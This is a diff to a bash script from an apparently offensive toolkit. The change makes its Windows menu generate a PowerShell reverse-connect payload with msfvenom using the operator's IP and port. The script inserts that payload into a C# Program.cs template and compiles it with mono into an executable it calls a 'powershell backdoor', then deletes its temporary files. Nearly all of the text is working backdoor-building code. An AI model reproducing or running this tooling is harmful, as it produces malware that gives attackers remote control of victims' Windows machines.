@@ -1949,54 +1949,51 @@ echo -e $okegreen ""
 					echo ""
 					gboor
 					spinlong
+					echo -e $okegreen ""
+                                        echo "[*] Creating your powershell payload"
+					$msfvenom -p $payload LHOST=$yourip LPORT=$yourport -f psh-cmd -o temp/powershell.txt > /dev/null 2>&1
 					echo ""
-					$pwned $payload $yourip $yourport > /dev/null 2>&1
 					echo ""
-					echo ""
-power=$path/powershell_attack.txt
+power=$path/temp/powershell.txt
                                         if [ ! -f "$power" ]
                                         then
                                         echo -e $red ""
-                                        echo "Unable to find the output $power"
+                                        echo "[x] Unable to create powershell payload ."
                                         echo -e $okegreen ""
 read -rsp $'Press any key to return to return to menu\n' -n 1 key
 clear
 PwnWinds
 fi
-					#Removing first 20 characters and last from payload
-                                        cuts=$(sed -r 's/^.{20}//' powershell_attack.txt) 
-                                        echo $cuts > output/cuts.tmp
- 
-#Removing last character of payload   
-                                        cuts1=$(sed '1 s/.$//' output/cuts.tmp)
-                                        echo $cuts1 > output/cuts1.tmp              
-                                        cp $B $path/output/Program.cs
+                                        echo "[✔] Done!"
+					cp $B $path/output/Program.cs
                                         tgt=$path/output/Program.cs
-                                        pld=$(cat output/cuts1.tmp)
+                                        pld=$(cat temp/powershell.txt)
                                         
 #Inserting Payload into Program.cs file
-                                        sed -i "s/PAYLOAD/$pld/g" $tgt
+echo "[*] Merging your payload into final script"
+                                        sed -i "s|PAYLOAD|$pld|g" $tgt
                                         
 powerf=$path/output/Program.cs
-size=7
+size=6
 actualsize=$(du -k "$powerf" | cut -f 1)
                                         if [ $actualsize -ge $size ]
                                         then
                                         echo -e $okegreen ""
+echo "[✔] Done!"
 else 
 echo -e $red ""
-echo "There was a problem inserting the payload into final file to be compiled
-at $powerf "
+echo "[x] There was an error payload into final script file "
 echo ""
-                                        rm unicorn.rc powershell_attack.txt $bcom >/dev/null 2>&1
-                                        rm -rf $path/output/cuts.tmp >/dev/null 2>&1
-                                        rm -rf $path/output/cuts1.tmp >/dev/null 2>&1
+                                        rm $bcom >/dev/null 2>&1
+                                        rm temp/powershell.txt >/dev/null 2>&1
+echo -e $okegreen ""
 read -rsp $'Press any key to return to return to menu\n' -n 1 key
 clear
 PwnWinds
 fi
                                         echo -e $okegreen ""
-
+sleep 2
+echo "[*] Compiling your powershell backdoor "
 
 
 					dmcs $bcom -o "output/$fira.exe" > /dev/null 2>&1
@@ -2006,16 +2003,17 @@ power=$path/output/$fira.exe
                                         echo -e $red ""
                                         echo "Unable to compile with mono $powerf into $power"
                                         echo -e $okegreen ""
-                                        rm unicorn.rc powershell_attack.txt $bcom >/dev/null 2>&1
-                                        rm -rf $path/output/cuts.tmp >/dev/null 2>&1
-                                        rm -rf $path/output/cuts1.tmp >/dev/null 2>&1
+                                        rm $bcom >/dev/null 2>&1
+                                        rm temp/powershell.txt >/dev/null 2>&1
+                                        
 read -rsp $'Press any key to return to return to menu\n' -n 1 key
 clear
 PwnWinds
 fi
-					rm unicorn.rc powershell_attack.txt $bcom >/dev/null 2>&1
-                                        rm -rf $path/output/cuts.tmp >/dev/null 2>&1
-                                        rm -rf $path/output/cuts1.tmp >/dev/null 2>&1
+echo -e $okegreen ""
+echo "[✔] Done!"
+					rm $bcom >/dev/null 2>&1
+                                        rm temp/powershell.txt >/dev/null 2>&1
 					sleep 2
 					echo ""
 					echo -e $okegreen""
